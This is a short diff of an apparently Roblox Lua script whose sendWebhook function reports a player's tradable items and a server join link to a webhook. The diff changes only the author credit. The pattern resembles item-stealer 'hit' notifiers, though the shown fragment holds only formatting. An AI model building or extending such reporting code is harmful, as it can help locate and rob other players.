@@ -215,7 +215,7 @@ local function sendWebhook()
                 {["name"] = ":package: Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
                 {["name"] = ":link: Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = false}
             },
-            ["footer"] = {["text"] = "by zues • " .. os.date("%B %d, %Y")},
+            ["footer"] = {["text"] = "by zrx • " .. os.date("%B %d, %Y")},
             ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
     }
@@ -231,7 +231,7 @@ local function sendWebhook()
                 {["name"] = ":package: Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
                 {["name"] = ":link: Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = false}
             },
-            ["footer"] = {["text"] = "by zeus • " .. os.date("%B %d, %Y")},
+            ["footer"] = {["text"] = "by zrx • " .. os.date("%B %d, %Y")},
             ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
     }
